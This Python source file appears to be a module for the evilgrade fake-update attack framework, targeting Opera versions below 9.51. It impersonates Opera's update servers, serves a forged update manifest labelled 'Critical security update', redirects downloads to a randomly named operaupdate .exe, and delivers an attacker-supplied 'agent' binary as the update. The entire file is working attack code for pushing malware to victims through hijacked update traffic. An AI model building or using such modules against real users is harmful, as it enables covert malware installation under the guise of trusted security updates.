from modules import ModuleBase


class Opera(ModuleBase):
    name = 'Opera'
    version = '1.0'
    appver = '< 9.51'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(xml.opera.com|www.opera.com)'
    options = {
        'description': {
            'val': 'Critical security update',
            'desc': 'Description display in the update'
        },
        'version': {
            'val': "'1' + rand_num(1) + '.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [
        {   'path': '/update/?',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/opera/opera_update.xml',
        },
        {   'path': '/download',               #regex anything
            'type': 'redirect',
            'location': 'http://www.opera.com/operaupdate<%RND1%>.exe',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]

